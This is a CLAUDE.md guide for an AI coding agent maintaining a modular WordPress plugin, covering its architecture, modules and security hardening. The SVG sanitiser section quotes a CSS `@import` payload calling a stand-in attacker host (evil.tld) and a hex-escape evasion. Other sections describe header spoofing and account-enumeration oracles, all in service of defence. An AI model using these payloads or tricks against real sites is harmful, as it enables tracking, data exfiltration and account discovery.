# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project overview

**Studio Kyne Mini Tools** is a modular WordPress plugin (PHP 7.4+, WP 5.8+). No build step, no Composer, no npm — pure PHP with a custom PSR-4 autoloader. There are no automated tests. Third-party JS is vendored as-is under `assets/admin/js/vendor/` (e.g. `sortable.min.js`), never bundled.

## Releases

Versions are tracked in two places in `studio-kyne-mini-tools.php` and must be kept in sync:
- The `* Version:` header comment
- `define( 'SKMT_VERSION', '...' )`

**Dev releases** are triggered automatically on every push to `dev` (GitHub Actions bumps the version, tags, and publishes a pre-release ZIP).  
**Stable releases** are triggered manually via `workflow_dispatch` on the `main` branch.

Never bump the version manually — the CI workflows handle it.

`Core/Updater.php` caches the GitHub response for 12h **and caches failures for 15 min**. Without that negative cache, an unreachable GitHub or an exhausted anonymous quota (60 req/h) fires a fresh 10-second HTTP call on every update check, i.e. on nearly every admin page load. The manual "check for updates" button deletes both transients first, so it always bypasses it.

## Architecture

### Boot sequence

```
plugins_loaded → Plugin::instance() (singleton)
  └─ init hook → on_init()
       ├─ load_textdomain()
       ├─ Modules::register_default_modules()   ← fires skmt_module_definitions filter
       └─ Modules::init_active_modules()         ← calls Module::init() on each active module
```

`Admin` is instantiated inside the same `Plugin` constructor, only when `is_admin()`.

### Autoloader

`StudioKyne\MiniTools\` maps directly to `includes/`. Example: `StudioKyne\MiniTools\Modules\Security\RateLimiter` → `includes/Modules/Security/RateLimiter.php`. No composer, no vendor directory.

### Settings storage

| Scope | Option key | Access pattern |
|---|---|---|
| Global plugin | `skmt_settings` | `Settings::get('global.update_channel')` (dot notation) |
| Module state | `skmt_settings` → `modules.{id}` | `Settings::get('modules.security')` |
| Per-module config | `skmt_module_{id}` | `AbstractModule::get_module_settings()` |

Rate limiter entries are **transients**, keyed `_skmt_rl_{md5(ip)}` with a 24h TTL — they expire on their own and are deliberately absent from `get_uninstall_keys()`. The per-user menu profile cache is also a transient (`skmt_wl_menu_user_{id}`, 1h).

`AbstractModule::get_module_settings()` merges stored values over the defaults **recursively**, descending into associative arrays but replacing lists (roles, IP allowlists) wholesale. `wp_parse_args()` alone only merges the top level: any sub-key added in a later version would be missing from existing installs until the user re-saved the screen, so a new setting whose default is `true` would silently arrive as `false` everywhere.

### Module system

Each module is a class extending `AbstractModule` (which implements `ModuleInterface`). Required methods:

- `init(): void` — register all WordPress hooks here
- `get_settings(): array` — return current settings
- `save_settings(array $settings): bool` — sanitize and persist; the core applies no sanitization
- `static get_defaults(): array` — nested array of defaults, merged recursively by `get_module_settings()`
- `static get_uninstall_keys(): array` — declare `options`, `meta` (**post** meta) and `user_meta` keys for uninstall cleanup. The two meta channels live in different tables: a user meta declared under `meta` is never deleted.

Optional overrides: `get_admin_css()`, `get_admin_js()`, `get_admin_js_deps()`, `get_admin_js_data()`, `to_form_payload()`, `get_export_extras()` / `import_extras()`, `get_required_capability()`, `on_activate()`, `on_deactivate()`.

`static get_required_capability(): string` — capacité exigée pour ouvrir l'écran du module **et** appeler ses endpoints ; `manage_options` par défaut. À surcharger par tout module dont le pouvoir dépasse le site courant : sous **multisite**, `manage_options` est une capacité **par site**, si bien que l'administrateur d'un simple sous-site l'obtient — un gestionnaire de fichiers ou un éditeur SQL lui livrent alors le réseau entier, fichiers et base étant communs. Fichiers et Base de données renvoient donc `is_multisite() ? 'manage_network_options' : 'manage_options'`. `Admin` s'en sert pour la capacité de `add_submenu_page()` (WordPress masque l'entrée) **et** re-teste dans `render_page()` : l'URL de l'onglet reste devinable, c'est là que le refus compte.

**Garde `ABSPATH`.** Tout fichier PHP de l'extension porte `defined( 'ABSPATH' ) || exit;` — après la ligne `namespace` s'il y en a une, sinon après le docbloc de tête. Sans elle, une requête directe sur le fichier l'exécute hors de WordPress : `templates/components/sidebar.php` répondait 200 avec une erreur fatale divulguant le chemin absolu du serveur. C'est aussi bloquant pour toute soumission au dépôt WordPress.org.

`get_export_extras()` / `import_extras()` déclarent l'état du module rangé **hors** de `skmt_module_{id}` (MenuCreator : les profils sous `skmt_wl_menu_profiles`). Sans ça, l'export de configuration se croit complet alors qu'il laisse cette option de côté. Le bloc atterrit sous `extras.{module_id}` dans le JSON, et l'import le renvoie au module — qui le réassainit lui-même, comme `to_form_payload()` pour les réglages.

`get_admin_js_deps()` returns handles of already-registered scripts the module's JS depends on. Use it for shared third-party libraries rather than returning their URL from `get_admin_js()`: two modules doing the latter produce two handles for the same file, which WordPress cannot deduplicate. `skmt-sortable-js` is registered by `Admin::enqueue_assets()` and consumed this way by MenuCreator; the Media module enqueues the same handle.

`to_form_payload(array $stored): array` converts **stored** settings into the shape `save_settings()` expects. It exists for configuration import, which must reuse the module's own sanitiser rather than write JSON straight to the option. The default is the identity — override it only when the two shapes differ (Security stores under `authentication`/`hardening` what the form posts flat).

Modules can depend on classes from another module's namespace (e.g. `MenuCreator\Module` uses `WhiteLabel\MenuProfileManager` for profile storage/resolution) — this is fine since the autoloader has no per-module isolation, but be aware the dependent module won't work correctly if the other module is deactivated/uninstalled.

**Module settings template** lives at `includes/Modules/{ModuleName}/settings-template.php` (loaded by `templates/admin/module-settings.php`). Available variables: `$module_id`, `$module`, `$instance`, `$module_settings`, `$tab`.

Form fields must use `name="skmt_module_settings[field_name]"` and the hidden input `skmt_tab=module_{id}` so `Admin::handle_save_settings()` routes the POST correctly.

`get_admin_js_data()` return values are injected into `window.skmtAdmin` by `Admin::enqueue_module_assets()`: the `i18n` key is merged into `window.skmtAdmin.i18n`, and every other key is set directly as `window.skmtAdmin[key]` (JSON-encoded). Use this to pass arbitrary module data (e.g. `mcProfiles`, `wpMenu`) to JS, not just translations.

### Admin form flow

All settings forms POST to `admin-post.php`. The action name determines the handler:
- `skmt_save_settings` → `Admin::handle_save_settings()`
- `skmt_toggle_module` → `Admin::handle_toggle_module()`
- `skmt_update_modules` → `Admin::handle_update_modules()`
- `skmt_check_updates` → `Admin::handle_check_updates()`
- `skmt_reset_settings` → `Admin::handle_reset_settings()`

All handlers verify a nonce and `manage_options` capability, then redirect with `?skmt_notice=...`.

**Settings import** (`handle_import_settings()`) must never write the uploaded JSON straight to the options — that bypasses every module sanitiser (unfiltered HTML in the white-label footer, arbitrary SVG roles, free-form login slug). Each module block is replayed through `to_form_payload()` then `save_settings()`, so the file takes exactly the same path as the form. Two details matter: `false` values are stripped before the call, because an HTML form omits its unchecked boxes and some modules test `isset()` rather than the value; and the `skmt_settings` block is merged over the existing option rather than replacing it, so a partial file does not wipe the activation state of the modules it does not mention. Avant toute lecture : `is_uploaded_file()` sur `$_FILES[…]['tmp_name']` — cette valeur vient du client, et c'est la seule chose qui atteste qu'elle désigne bien un fichier déposé par *cette* requête et non un chemin arbitraire du serveur — puis un plafond `IMPORT_MAX_BYTES` (2 Mio), le fichier étant lu en entier **puis** décodé en JSON, soit deux copies en mémoire.

**Téléchargements.** Tout en-tête `Content-Disposition` passe par `Admin::content_disposition( $filename )`. Le nom était injecté tel quel entre guillemets : sous Linux un nom de fichier peut contenir un guillemet — qui referme la valeur et laisse ajouter des paramètres — voire un retour à la ligne, qui termine l'en-tête. L'aide rend les deux paramètres de la RFC 6266 : `filename=` en ASCII assaini pour les clients anciens, et `filename*=UTF-8''…` percent-encodé, qui porte le nom réel sans guillemets à refermer.

### AJAX endpoints

Module AJAX actions follow `wp_ajax_skmt_{module}_{action}` naming and a consistent guard pattern at the top of every handler:
```php
check_ajax_referer( 'skmt_admin_nonce', 'nonce' ); // or wp_verify_nonce() + manual wp_send_json_error()
if ( ! current_user_can( 'manage_options' ) ) {
    wp_send_json_error( [ 'message' => __( 'Permissions insuffisantes.', 'studio-kyne-mini-tools' ) ] );
}
```
All request data goes through `sanitize_text_field( wp_unslash( $_POST[...] ) )` (or the type-appropriate sanitizer) before use; responses use `wp_send_json_success()` / `wp_send_json_error()`. The nonce is created once via `wp_create_nonce( 'skmt_admin_nonce' )` and shared across modules (see `window.skmtNotifData.nonce` / `window.skmtAdmin`).

### Icon system

Icons are inline SVGs rendered via `Admin::render_icon(string $icon, string $size, string $extra_class)`. Available icons are defined in `Admin::get_icon_paths()`: `layout-dashboard`, `package`, `settings`, `image`, `check-circle`, `info`, `shield`, `bell`, `x`, `log-in`, `folder`, `chevron-down`, `palette`, `menu`.

**Never invent or hand-draw an SVG icon.** All icons in this project come from
[Lucide](https://lucide.dev). If you need an icon that is not already in
`Admin::get_icon_paths()` (or inlined in a module's JS), **stop and ask the user
for it** — they will paste the exact Lucide SVG. Do not approximate one by editing
the path data of another icon, and do not fabricate path coordinates: the result
looks broken and drifts from the rest of the UI.

This applies to inline SVGs in JS modules too (e.g. the folder icons in
`assets/admin/js/modules/media.js`), not just `get_icon_paths()`.

### Persistent notices

Separate from the ephemeral toast system (`skmtShowToast`), `Admin::add_persistent_notice(string $id, string $message, string $type, int $user_id = 0)` / `Admin::dismiss_persistent_notice(string $id)` store notices in a user's `skmt_notices` user meta so they survive page reloads. `$user_id` defaults to the current user but can target a specific user from a userless context (e.g. cron completing a background job). Rendered into `window.skmtPersistentNotices` in the notification drawer; dismissed client-side via the `wp_ajax_skmt_dismiss_notice` endpoint (`Admin::handle_dismiss_notice()`).

## Module specifics

### Security

- **ClientIp**: the single source of truth for the visitor's IP. Proxy headers (`CF-Connecting-IP`, `X-Forwarded-For`) are sent by the client, so they are consulted **only** when the admin has declared the topology through the `authentication.ip_source` setting (`remote_addr` by default). Reading them unconditionally made the rate limiter bypassable — a fresh header per request means a fresh counter — and let anyone impersonate an allowlisted IP. Never resolve the IP anywhere else: `RateLimiter` and `Module` each used to carry their own version, one taking the first `X-Forwarded-For` entry and the other the last, so failures were counted under a key the block never read. For `x_forwarded_for`, the **last** entry is the one the nearest proxy wrote — the ones to its left come straight from the incoming request.
- **RateLimiter**: hooks into the `authenticate` filter at priority 999 (returns `WP_Error` to block). Failure tracking via `wp_login_failed` hook. Success reset via `wp_login` hook. `maybe_block_login($user)` is the filter callback.
- **Mots de passe d'application.** Ils ne traversent PAS `wp_authenticate()` : `wp_validate_application_password()` appelle directement `wp_authenticate_application_password()`, si bien que ni le filtre `authenticate` ni l'action `wp_login_failed` ne sont consultés — les mots de passe d'application étaient devinables sans aucune limite, même depuis une IP déjà bloquée sur le formulaire. Le cœur n'offre aucun filtre de refus sur ce chemin : le seul point d'arrêt **antérieur** à la comparaison du mot de passe est `application_password_is_api_request`, auquel on répond `false` quand `RateLimiter::is_locked()` (la fonction sort alors avant toute vérification, et la requête repart anonyme, donc en 401). Le comptage passe par l'action `application_password_failed_authentication`. `is_locked()` existe précisément pour les chemins d'authentification qui n'ont pas de `WP_Error` à rendre.
- **LoginUrlHandler**: hooks into `wp_loaded` to intercept both the custom login slug and direct `wp-login.php` access. Must check `action !== 'logout'` before redirecting logged-in users. Path handling has two rules that are easy to get wrong: compare `basename($path)` to detect `wp-login.php` (testing the whole URI made any `?redirect_to=…wp-login.php` — which WordPress generates itself — return a 404), and anchor the custom slug on the **install path** from `site_url()`, not on `/` (a subdirectory install serves `/wp/connexion`, and a pattern anchored on `/connexion` matches nothing while `wp-login.php` stays blocked — a complete lockout). Build the login URL from `get_option('siteurl')`, never from `site_url()`: this class filters `site_url`, so calling it here recurses.
- **Escape hatch**: `define( 'SKMT_DISABLE_LOGIN_URL', true )` in `wp-config.php` restores `wp-login.php`. Without it a forgotten slug has no recovery path from the browser.
- **HardeningService — énumération des comptes.** Cinq surfaces, une seule promesse ; en oublier une revient à ne rien bloquer.
  - **Archives d'auteur** : le blocage vit sur `parse_request` **@1**, pas sur `template_redirect`. Branché là, il courait après `redirect_canonical` : WordPress répondait `301 Location: /author/studiokyne/` — l'identifiant sortait dans l'en-tête, avant que le blocage n'ait la parole, et seule la page d'archive finale était protégée. On traite les **deux** variables (`author` pour `?author=N`, `author_name` pour `/author/slug/`), puis on force un 404 sur `wp` (retirer la variable ne suffit pas : la requête se rabattrait sur la liste des articles). La réponse est un **404 uniforme**, jamais un 403 : les trois codes distincts d'avant (301 / 403 / 404) formaient à eux seuls un oracle — on savait qu'un compte existait sans même lire la page.
  - **REST** : `prevent_rest_user_enumeration()` laisse passer `/wp/v2/users/me` pour tout utilisateur **connecté**. Exiger `list_users` (capacité d'administrateur) sur toute la branche `/wp/v2/users` renvoyait 403 à chaque auteur ou contributeur et **cassait l'éditeur de blocs**, alors que cette route ne divulgue que le compte de l'appelant. Le test de route est ancré (`^/wp/v2/users(/|$)`) : `strpos()` reconnaissait la sous-chaîne n'importe où.
  - **oEmbed** : `/wp-json/oembed/1.0/embed` sert `author_name` et `author_url` sans authentification, pour n'importe quel article. On vide les deux clés via `oembed_response_data` plutôt que de fermer la route — l'aperçu reste fonctionnel.
  - **Plan de site** : `/wp-sitemap-users-1.xml` liste les archives d'auteur et se fait indexer. Le fournisseur `users` est retiré via `wp_sitemaps_add_provider`.
  - **Formulaire de connexion** : il opposait « cet identifiant n'est pas inscrit » à « ce mot de passe ne correspond pas à l'identifiant X ». On passe par le filtre **`wp_login_errors`** (qui reçoit l'objet `WP_Error`), et **surtout pas** par `login_errors` en lisant le `$errors` global : `LoginUrlHandler::wp_loaded()` charge wp-login.php avec un `require_once` **depuis une méthode**, si bien que le `$errors` de wp-login.php est une variable locale de cette méthode et n'atteint jamais la portée globale — le filtre ne verrait rien. Le message est remplacé en **conservant le code** (wp-login.php se sert de `incorrect_password` juste après pour re-remplir le champ identifiant) ; `empty_password` et les erreurs de cookies restent intactes, elles ne disent rien d'un compte.
  - **Mot de passe oublié** : réécrire le message n'y suffit pas, l'oracle est dans la **forme** de la réponse — un compte connu redirige vers `?checkemail=confirm`, un compte inconnu réaffiche le formulaire. `mask_lost_password_oracle()` (action `lost_password`) rejoue donc la redirection quand `invalidcombo` est la seule erreur. Le filtre `lostpassword_errors` ne convient pas : le cœur ajoute `invalidcombo` **après** l'avoir appliqué. Réserve assumée : `retrieve_password_email_failure` reste distinguable — le masquer priverait l'administrateur du seul signal qui l'avertit que l'envoi d'e-mails de son site est cassé, et sur un site dont l'envoi fonctionne ce code n'apparaît jamais.
- **`X-Powered-By`** vient de **PHP** (`expose_php`), pas de WordPress : `unset( $headers['X-Powered-By'] )` sur le filtre `wp_headers` ne portait que sur le tableau que WordPress s'apprêtait à émettre, et l'en-tête sortait sur toutes les réponses réglage activé. Il faut `header_remove()`, branché au plus tôt (`init` @0 et `send_headers` @0) puisqu'il n'agit que tant que les en-têtes ne sont pas partis. La vraie solution reste `expose_php = Off` : elle couvre aussi ce qui ne passe pas par WordPress.

### WhiteLabel

Four concerns in one module (all `Module.php` except menu profiles), each hooked only when its own setting group is enabled:
- **Admin bar / footer cleanup**: each toggle in `admin_bar`/`footer` settings conditionally registers its own `admin_bar_menu`/`admin_head`/`gettext`/`show_admin_bar` hook in `init()` — nothing is hooked unless the corresponding setting is enabled.
- **Profile page cleanup** (`profile` settings): if any `profile.*` toggle is on, an `admin_head` hook (`clean_profile_page()`) injects CSS on `profile.php`/`user-edit.php` to hide chosen core sections (color scheme, keyboard shortcuts, toolbar toggle, application passwords, language, bio, sessions, editor options). Visual masking only — the underlying features stay server-side intact. Targets stable core `<tr>`/section classes rather than `remove_action` (registrations vary by WP version).
- **Local avatars** (`avatars.local` setting): when on, a `get_avatar_data` filter (`apply_local_avatar()`) swaps in the user's uploaded image; a media-picker field is rendered on the profile form via `personal_options` and saved to the `skmt_local_avatar` user meta (declared in `get_uninstall_keys()`). No avatar meta → WordPress falls back to Gravatar. The native "Profile Picture" (Gravatar) row is hidden via `admin_head` CSS.
- **Menu profile storage** (`MenuProfileManager.php`): a static, settings-independent CRUD/resolution layer stored under its own option `skmt_wl_menu_profiles` (not `skmt_module_white_label`). `get_active_for_user()` resolves the highest-priority active profile per user (include_users > include_roles > apply_to_all, exclusions always win, ties broken by `updated_at`) and caches the result in a per-user transient (`skmt_wl_menu_user_{id}`, 1h TTL) — call `clear_user_cache()`/`clear_all_cache()` after any profile mutation. This class is consumed by the **MenuCreator** module, not by WhiteLabel's own `Module.php`.

### ImageOptimizer

Orchestrator (`Module.php`) over `ImageProcessor` (conversion/resize), `MediaLibrary` (media-list integration), `BulkProcessor` (batched WP-Cron optimization of the whole library), and `SvgHandler` (secure SVG upload support). `BulkProcessor` persists its state (including the initiating `user_id`) under `{module_option_key}` + `BULK_STATE_SUFFIX` and takes an optional `on_complete_fn(int $user_id)` callback fired once when the run finishes — the module uses it to drop a persistent notice for that user (works even though the cron tick has no current user). Current bulk state is passed to JS via `get_admin_js_data()` as `bulkState` so the UI can resume progress display on load. The bulk flow has a pre-scan step (`ajax_bulk_scan` → `BulkProcessor::ajax_scan()`) before `ajax_bulk_start`.

`SvgHandler` only registers its filters when the `svg_upload` setting is on. It gates uploads by role (`svg_roles`, sanitized against real WP roles in `Module::sanitize_roles()`), adds `image/svg+xml` to `upload_mimes`, fixes WordPress' MIME/ext detection (`wp_check_filetype_and_ext`), and sanitizes every SVG on upload (`wp_handle_upload_prefilter`) via a whitelist DOMDocument pass — strips non-whitelisted tags, event handlers, unsafe `href`/`xlink:href` (only internal anchors and `data:image/*` allowed), script-bearing attributes/styles, and rejects DOCTYPE+ENTITY (XXE). Never loads `LIBXML_NOENT`. A file that fails sanitization is rejected with an error rather than stored.

`<style>` est sur la liste blanche, et son **contenu textuel** est assaini par `clean_style_element()` → `sanitize_css()`. Seuls les *attributs* l'étaient : un `@import url("//evil.tld/x.css")` traversait l'assainisseur intact et déclenchait une requête sortante à chaque rendu du SVG (traçage, exfiltration de contexte via `url()`, CSS arbitraire si le SVG est intégré en ligne). Deux précautions d'ordre, les mêmes que pour `normalize_sql()` côté Base de données : les **commentaires CSS partent en premier**, et les **échappements hexadécimaux sont décodés avant tout test** — `\40 import` *est* `@import` pour le navigateur, ne pas le décoder ne reconnaît que la forme naïve de l'attaque. Les ressources (`url()`) passent par `is_safe_href()`, la même liste blanche que les attributs `href` : on n'entretient pas deux définitions du « sûr » qui finiraient par diverger. `expression()` et `-moz-binding` font retirer la **déclaration entière**, pas le seul mot-clé — effacer `expression(` laissait `alert(1))` derrière soi, du CSS invalide dans un fichier qu'on vient de déclarer propre.

### MenuCreator

Applies the `MenuProfileManager` profiles to the actual wp-admin menu: `custom_menu_order` (enabled per-user via `maybe_enable_custom_order`, not blindly) + `menu_order` filter for ordering, `admin_menu` action for visibility/relabeling/separators/custom links (including child/submenu reordering), `admin_head` for injecting per-item icon CSS overrides (base64 SVG or URL), custom-link `target` attributes, and a global menu-icon opacity fix (registered unconditionally). Menu-transforming hooks only register in `init()` if at least one profile is `status === 'active'`. `apply_menu_visibility()` snapshots the untouched WP menu into `self::$pristine_menu`/`$pristine_submenu` **before** mutating the globals, so the editor is fed the real WP menu (not our already-injected separators/custom links).

**Blocage d'accès.** Masquer un item ne fait que le retirer de la barre latérale : l'URL reste ouvrable. La case « Bloquer l'accès direct » (`block_access`, uniquement sur un item déjà masqué — `sanitize_menu_items()` force `false` sur un item visible) ajoute le refus côté serveur via `enforce_blocked_pages()` sur `admin_init` @1. `request_matches_slug()` reconstruit la requête attendue depuis le slug de menu (`slug_to_request()` gère les trois formes : `upload.php`, `edit.php?post_type=page`, et le slug de page d'extension servi par admin.php, y compris `wc-admin&path=/analytics/overview`) : les paramètres du slug doivent tous correspondre, et un slug sans `post_type`/`taxonomy`/`page` ne doit pas matcher une requête qui en porte un — sinon bloquer `edit.php` bloquerait aussi `edit.php?post_type=page`. Jamais actif sur `admin-ajax.php`/`admin-post.php`/`async-upload.php` (un refus y casserait des requêtes légitimes), et `index.php` renvoie un `wp_die` 403 au lieu de la redirection (qui pointe vers lui — boucle). Le message passe par un **toast** (`render_denied_toast()` sur `admin_footer`), pas par une `admin_notice` : celle-ci serait captée par le centre de notifications du plugin et n'apparaîtrait que sous la cloche, alors que l'utilisateur vient d'être redirigé et doit comprendre tout de suite. Le paramètre `skmt_denied` est retiré de l'URL en JS pour qu'un rechargement ne rejoue pas le message. **Ce n'est pas un système de permissions** : REST, WP-CLI et les capacités WP ne sont pas concernés.

**Export.** Les profils vivent sous `skmt_wl_menu_profiles`, hors de `skmt_module_menu_creator` : ils sortent de l'export global par le point d'extension `AbstractModule::get_export_extras()` / `import_extras()` (bloc `extras` du JSON, à côté de `modules`). Ces deux méthodes sont génériques — tout module rangeant son état dans une option à lui doit les surcharger. L'import fusionne par id (`MenuProfileManager::save()` écrase l'entrée de même id, ajoute sinon) : un fichier partiel ne supprime aucun menu. L'éditeur a en plus son propre export/import : deux boutons en icône seule dans l'en-tête de la colonne Menus — importer (upload) et « tout exporter » (download), tous les menus lus depuis `mcProfiles` — l'état en base, pas l'éditeur, pour ne pas embarquer des modifications non enregistrées) et « Exporter » dans le pied du panneau (le menu ouvert, état à l'écran compris). `ajax_import_profile` avale les trois formes (`{profiles:[…]}`, `{profile:…}`, profil nu), repasse chaque menu par `sanitize_profile()` et les crée en brouillon.

**Restriction par rôle des liens personnalisés.** Un item WP est déjà filtré par sa propre capacité ; un lien personnalisé n'est rattaché à rien, d'où le champ `roles` (vide = tout le monde). Le filtrage se fait en **n'ajoutant pas** l'entrée dans `apply_menu_visibility()` (`current_user_has_role()`) : la capacité d'`add_menu_page()` ne peut pas exprimer « ces rôles-là », WordPress ne raisonnant qu'en capacités.

**Historique et raccourcis.** Toute mutation de l'éditeur se termine par `setDirty(true)` : c'est donc `setDirty()` qui empile l'instantané (`pushHistory()`), plutôt qu'un appel par poignée — l'arbre, les champs et le picker en oublieraient un. L'instantané reprend `collectProfile()`, parce que les champs du panneau vivent dans le DOM et pas dans `ed.profile`, mais garde les items avec leurs propriétés d'exécution (`_uid`, `_wpLabel`), sans quoi le retour en arrière casserait la sélection. Deux instantanés à moins de 400 ms fusionnent, sinon chaque caractère tapé coûterait un Ctrl+Z. `applyHistory()` pose `hist.lock` pour que le `setDirty()` du re-rendu ne réempile pas, et revenir à l'index 0 remet le menu en état « enregistré ». Côté clavier : Ctrl/Cmd+S est toujours intercepté, Ctrl+Z / Ctrl+Y sont **laissés au champ** quand le focus est dans une saisie (l'annulation de texte native y est attendue).

**Entrées obsolètes.** `mergeWpMenu()` **conserve** les items dont le slug n'existe plus dans le menu WP courant et les marque `_stale` (badge Lucide `triangle-alert` dans l'arbre + bandeau `#skmt-mc-stale-bar` au-dessus, avec une action « Nettoyer »). Les purger en silence — ce que faisait la version précédente — effaçait le paramétrage d'une extension simplement désactivée le temps d'une mise à jour. Un slug inconnu est inoffensif côté application : `remove_menu_page()` ne fait rien et `apply_menu_order()` passe par un `array_diff`.

**Libellés.** `clean_menu_label()` retire les `<span>` **avec leur contenu** avant `wp_strip_all_tags()` : WP et les extensions collent leurs compteurs dans le titre lui-même (`Commentaires <span class="awaiting-mod">0</span>`), et un simple strip laissait des libellés du type « Commentaires 00 commentaire en modération » dans l'éditeur.

**Picker d'icônes.** Bibliothèque de ~150 SVG Lucide **repris tels quels de lucide-static v1.34.0** et groupés par catégorie dans `get_icon_library()` (`get_lucide_icons()` aplatit pour le JS, `get_icon_categories()` alimente les en-têtes) — voir la règle « jamais de SVG dessiné à la main » plus haut : pour en ajouter, récupérer le fichier officiel, pas approximer. Trois onglets : Bibliothèque (recherche + catégories), Médiathèque, Code SVG. Ce dernier passe par `ajax_sanitize_svg`, qui réutilise `ImageOptimizer\SvgHandler::sanitize()` — même risque, même liste blanche, on n'écrit pas un second nettoyeur. La recherche interroge `get_icon_aliases()` (slug → mots-clés FR/EN, servi comme `iconAliases`) et pas seulement le slug : ceux de Lucide sont anglais et rarement devinables depuis une interface française (`funnel` pour un filtre, `banknote` pour un billet, `boxes` pour un stock). Côté JS, `foldAccents()` replie les accents des deux côtés de la comparaison — inutile de doubler les entrées — et chaque mot saisi doit être trouvé, dans n'importe quel ordre. Une icône sans alias reste cherchable par son nom.

**Icônes — deux pièges structurels.** `inject_menu_icon_overrides()` cible le `<li>` par son attribut `id` (index 5 de `$menu`, reproduit par `menu_dom_id()`), **jamais** par une recherche de sous-chaîne dans le `href` : WooCommerce enregistre « Marketing » sous le slug `woocommerce-marketing` puis réécrit l'URL du menu en `admin.php?page=wc-admin&path=/marketing` — le href ne contient plus le slug, et l'icône n'était jamais appliquée (même chose pour le top-level `woocommerce` → `page=wc-admin`). Le href reste un repli pour les entrées sans hookname. Second piège : une icône de menu SVG est monochrome et peinte pour la barre latérale **sombre** (fill `#f3f1f1` chez WooCommerce/Bricks, `stroke="currentColor"` dans un fichier Lucide uploadé). Rendue en `<img>`, `currentColor` n'hérite de rien et retombe au **noir** ; rendue dans l'éditeur (fond clair), le fill blanc est invisible. Les SVG **monochromes** (`svg_is_monochrome()` : `currentColor`, aucune couleur déclarée, ou une seule — même test dupliqué en JS) sont donc rendus en **masque CSS** (`.skmt-mc-icon` côté menu réel, `.skmt-wl-icon-mask` côté éditeur) : la source ne donne que la forme, la couleur vient de la feuille de style. Les autres médias (PNG, SVG multicolore — le logo du plugin lui-même, carré blanc + glyphe noir, qu'un masque aplatirait en carré plein) restent en `<img>` pour garder leurs couleurs. `resolve_icon_render()` tranche en lisant le fichier local via `read_local_svg()` ; côté éditeur, un SVG servi par URL est récupéré en `fetch` same-origin, mis en cache et l'arbre redessiné une fois.

The editor gets its data through `get_admin_js_data()` (keys `mcProfiles`, `wpMenu`, `wpSubmenu`, `wpRoles`, `wpRecentUsers`, `iconLibrary`, `iconCategories`, `iconAliases`) — there is **no** `ajax_get_wp_menu` endpoint. Drag-and-drop reordering uses vendored SortableJS (`assets/admin/js/vendor/sortable.min.js`). Ships its own AJAX endpoints (`skmt_wl_*` action names despite living in the MenuCreator module) and embeds a Lucide icon library inline in `get_lucide_icons()` for the icon picker.

### Login

Customizes the WordPress login page via `login_*` hooks (`login_enqueue_scripts`, `login_head` CSS variables, `login_headerurl`/`login_headertext` logo, `login_footer` side panel + DOM tweaks). Each optional hide/toggle (language dropdown, lost-password, back-to-blog) is registered conditionally. Settings stored under `skmt_module_login`.

### Files

`FileManager.php` is a standalone filesystem service rooted at `ABSPATH`; `Module.php` is a thin AJAX/admin-post wrapper (`ajax_list`, `ajax_delete`, `ajax_rename`, `ajax_move`, `ajax_mkdir`, `ajax_zip`, `ajax_extract`, `ajax_get_content`, `ajax_save_content`, `ajax_upload`, plus a `admin_post_skmt_files_download` streaming download handler). All path input goes through `get_post_path()` (`sanitize_text_field` + `rawurldecode`) before reaching `FileManager` — never trust a client-supplied path directly. `FileManager::save_content()` throws on a read-only or unwritable target: never swallow that return value, or the editor reports a successful save while nothing reached the disk.

The code editor is CodeMirror **shipped with WordPress** (`wp-codemirror`), not a vendored copy. `Module::enqueue_code_editor()` runs on `admin_enqueue_scripts` at **priority 5** (Admin reads `get_admin_js_data()` at 10) and calls `wp_enqueue_code_editor()` once per entry of `EDITABLE_EXTENSIONS`, collecting the per-extension settings into the `codeEditor` JS payload. Core's `wp-admin/js/code-editor.js` already wires as-you-type autocompletion for HTML/CSS/JS/PHP — do not reimplement it. `wp_enqueue_code_editor()` returns `false` when the user disabled syntax highlighting in their profile; the payload is then emptied and `files.js` falls back to the bare textarea. Keep `EDITABLE_EXTENSIONS` in sync with `isEditable()` in `files.js`.

Only the default (light) CodeMirror theme ships with core, so the dark palette lives in `files.css` under `.skmt-files-editor`. The hint dropdown is appended to `<body>`: it needs `ul.CodeMirror-hints` (element + class) to outrank `ul.CodeMirror-hints { z-index: 101 }` in `wp-admin/css/widgets.css`.

**`DISALLOW_FILE_EDIT` / `DISALLOW_FILE_MODS`.** `check_file_mods( bool $edition )` ouvre chaque endpoint mutant. Ces constantes ne sont pas un réglage cosmétique : elles disent « personne ne modifie de fichier depuis le navigateur sur ce site », et un gestionnaire de fichiers qui les ignore est plus permissif que l'éditeur du cœur qu'elles désactivent. Elles ne portent pas sur la même chose — `DISALLOW_FILE_EDIT` désigne l'**édition de code** (`ajax_save_content`, `ajax_upload`), `DISALLOW_FILE_MODS` toute modification de fichier (les précédents plus renommer, déplacer, supprimer, `mkdir`, zipper, extraire). La **lecture** (listing, aperçu, téléchargement) reste ouverte dans les deux cas : aucune des deux ne parle de lecture.

### Media

Virtual media folders as a `skmt_media_folder` taxonomy on `attachment` — no file is ever moved on disk. Filtering is **entirely server-side**: the taxonomy is registered with `'query_var' => 'skmt_folder'`, which `wp_ajax_query_attachments()` whitelists for every attachment taxonomy, so the view only sets `collection.props.set('skmt_folder', id)` and no ID list ever transits. Two registration args are mandatory: that `query_var`, and `'update_count_callback' => '_update_generic_term_count'` (the default callback only counts `publish` posts, and media are `inherit`). Always clear the raw query var before `WP_Query::parse_tax_query()` sees it, or WordPress ANDs its own slug-resolved clause with ours and the result is always empty.

Assets load on the `wp_enqueue_media` action — the only anchor that covers every context (upload.php, block editor, Customizer, widgets, site editor, frontend builders like Bricks). A second `admin_enqueue_scripts` @100 hook covers `upload.php?mode=list`, the one screen without `wp.media`.

`media.js` mounts the same vanilla `FolderPanel` two ways: as an extension of `wp.media.view.AttachmentsBrowser` (grid + every modal), and standalone in the list view. It also patches `wp.media.view.Attachment.Details` **and** `.TwoColumn` to add the per-media folder checkboxes — at DOM ready, not at parse time, because `media-grid.js` defines `TwoColumn` and may be printed after us. Folder ids reach the Backbone model via a `wp_prepare_attachment_for_js` filter (`skmtFolders`), so opening a media's details costs no extra request.

Drag & drop uses SortableJS **only to carry the gesture** (`forceFallback: true`, `sort: false`); drop targets are resolved by hit-testing `document.elementFromPoint`. Do not turn the folder list into Sortable drop zones — its `emptyInsertThreshold` lands items in the neighbouring folder.

